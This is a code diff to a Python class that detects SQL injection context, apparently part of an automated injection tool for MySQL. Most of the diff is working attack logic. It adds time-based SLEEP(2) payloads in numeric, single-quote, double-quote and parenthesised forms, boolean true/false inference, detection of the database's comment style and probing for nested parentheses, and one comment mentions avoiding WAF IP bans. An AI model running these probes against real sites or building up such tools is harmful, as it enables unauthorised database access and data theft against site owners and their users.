@@ -2,78 +2,109 @@ import random
 import re
 
 class ContextDiscoverer:
-    def __init__(self, client, disable_strings=True):
+    def __init__(self, client, disable_strings=False):
         self.client = client
         self.disable_strings = disable_strings
-        self.probes = [
-            {"name": "bracket_single", "payload": " )", "weight": 1.0},
-            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
-            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
-        ]
         self.detected_context = "UNKNOWN"
+        self.comment_style = "-- -"
+        self.wrappers = []
 
     def discover(self):
-        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
+        print("[*] Phase: Context Discovery (The Dynamic Eye) active.", flush=True)
         
         # 1. Baseline Request
-        baseline = self.client.send_request("")
-        baseline_len = len(baseline['text'])
+        baseline = self.client.send_request("1")
+        baseline_time = baseline.get('latency', 500)
         
         # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
-        print("  [?] Probing: Direct Logic Pulse (NUMERIC vs STRING)...", flush=True)
+        print("  [?] Probing: Injection Point Identification...", flush=True)
         
-        pulse_num = self.client.send_request(" OR true -- -")
-        len_num = len(pulse_num['text'])
-        
-        if self.disable_strings:
-            # Skip all quote-based probes to avoid WAF IP bans or application crashes.
-            pulse_backslash_break = self.client.send_request("\\")
-            if self._check_sql_errors(pulse_backslash_break['text']):
-                 print("  [WARNING] Detected strict quote sanitation via Backslash. Switching to QUOTELESS context.", flush=True)
-                 self.detected_context = "QUOTELESS_STRING" 
-            elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
-                 self.detected_context = "NUMERIC"
-            else:
-                 self.detected_context = "QUOTELESS_STRING" # Fallback to safest route
-            
-            print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
-            return
-            
-        # Rest of standard discovery...
-        pulse_sq = self.client.send_request("' OR true -- -")
-        pulse_sq_break = self.client.send_request("'")
-        pulse_backslash_break = self.client.send_request("\\")
-        
-        len_sq = len(pulse_sq['text'])
-        
-        if self._check_sql_errors(pulse_sq_break['text']):
-            self.detected_context = "SINGLE_QUOTE"
-        elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
-            self.detected_context = "NUMERIC"
-        elif self._check_sql_errors(pulse_backslash_break['text']) and not self._check_sql_errors(pulse_sq_break['text']):
-            print("  [WARNING] Detected strict quote sanitation (likely replaced with /). Switching to QUOTELESS context.", flush=True)
-            self.detected_context = "QUOTELESS_STRING" 
-        elif len_sq != baseline_len and not self._check_sql_errors(pulse_sq['text']):
-            self.detected_context = "SINGLE_QUOTE"
-        else:
-            self.detected_context = "SINGLE_QUOTE"
+        # We test different contexts with a time-based delay if possible, or boolean logic
+        test_cases = [
+            {"name": "NUMERIC", "payload": " AND SLEEP(2)", "verify": "AND 1=1"},
+            {"name": "SINGLE_QUOTE", "payload": "' AND SLEEP(2) AND '1'='1", "verify": "' AND '1'='1"},
+            {"name": "DOUBLE_QUOTE", "payload": "\" AND SLEEP(2) AND \"1\"=\"1", "verify": "\" AND \"1\"=\"1"},
+            {"name": "PAREN_NUMERIC", "payload": ") AND SLEEP(2) AND (1=1", "verify": ") AND (1=1"},
+            {"name": "PAREN_SINGLE_QUOTE", "payload": "') AND SLEEP(2) AND ('1'='1", "verify": "') AND ('1'='1"},
+        ]
 
-        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
+        found = False
+        for case in test_cases:
+            if self.disable_strings and ("'" in case['payload'] or "\"" in case['payload']):
+                continue
+                
+            # Try Time-based probe first (most accurate for context)
+            print(f"  [>] Testing context candidate: {case['name']}...", flush=True)
+            res = self.client.send_request(case['payload'])
+            
+            # If latency > baseline + 1.5s, we likely found the context
+            if res.get('latency', 0) > baseline_time + 1500:
+                self.detected_context = case['name']
+                found = True
+                print(f"  [+] Match found via TIME-DELAY in {case['name']}", flush=True)
+                break
+            
+            # Fallback: Boolean-based check if time fails
+            res_bool = self.client.send_request(case['verify'])
+            if len(res_bool['text']) == len(baseline['text']) and not self._check_sql_errors(res_bool['text']):
+                # Double check with a FALSE condition
+                false_payload = case['verify'].replace("1=1", "1=2").replace("\"1\"=\"1\"", "\"1\"=\"2\"").replace("'1'='1'", "'1'='2'")
+                res_false = self.client.send_request(false_payload)
+                if len(res_false['text']) != len(baseline['text']):
+                    self.detected_context = case['name']
+                    found = True
+                    print(f"  [+] Match found via BOOLEAN-INFERENCE in {case['name']}", flush=True)
+                    break
 
-        # 3. Structural Brackets inference
-        print("  [?] Probing: Structural Brackets inference...", flush=True)
-        # Using a logical break format: ) OR true -- -
-        logical_prefix = ")" if self.detected_context == "NUMERIC" else "')"
-        bracket_probe = f"{logical_prefix} OR true -- -"
+        if not found:
+            print("  [!] Direct context matching failed. Attempting deep structural analysis...", flush=True)
+            self._deep_structural_probe()
         
-        bracket_res = self.client.send_request(bracket_probe)
-        if not self._check_sql_errors(bracket_res['text']) and len(bracket_res['text']) != baseline_len:
-            self.detected_context += "_PARENTHESIS"
-            print(f"  [+] Refined Context: {self.detected_context}", flush=True)
+        # 3. Comment Style Discovery
+        self._discover_comment_style()
         
-        # 4. MySQL Fingerprinting (Exclusive Specialization)
+        # 4. MySQL Fingerprinting
         db_type = self.fingerprint_mysql()
-        return {"context": self.detected_context, "db_type": db_type}
+        
+        return {
+            "context": self.detected_context, 
+            "db_type": db_type, 
+            "comment_style": self.comment_style,
+            "disable_strings": self.disable_strings
+        }
+
+    def _discover_comment_style(self):
+        print("  [?] Probing: Comment Signature Discovery...", flush=True)
+        styles = ["-- -", "#", "/*"]
+        for s in styles:
+            payload = f"1 AND 1=1 {s}"
+            if self.detected_context == "SINGLE_QUOTE":
+                payload = f"1' AND '1'='1' {s}"
+            
+            res = self.client.send_request(payload)
+            if not self._check_sql_errors(res['text']):
+                self.comment_style = s
+                print(f"  [+] Detected Comment Style: {s}", flush=True)
+                return
+
+    def _deep_structural_probe(self):
+        """Attempts to find deep parenthesis wraps like (('1'))"""
+        for depth in range(1, 4):
+            parens = ")" * depth
+            payload = f"{parens} OR 1=1 -- -"
+            res = self.client.send_request(payload)
+            if not self._check_sql_errors(res['text']):
+                self.detected_context = f"NUMERIC_PAREN_{depth}"
+                return
+            
+            payload_sq = f"'{parens} OR '1'='1' -- -"
+            res_sq = self.client.send_request(payload_sq)
+            if not self._check_sql_errors(res_sq['text']):
+                self.detected_context = f"QUOTE_PAREN_{depth}"
+                return
+        
+        # Final fallback
+        self.detected_context = "QUOTELESS_STRING" if self.disable_strings else "SINGLE_QUOTE"
 
     def fingerprint_mysql(self):
         """Exclusively validates and fingerprints MySQL environments."""
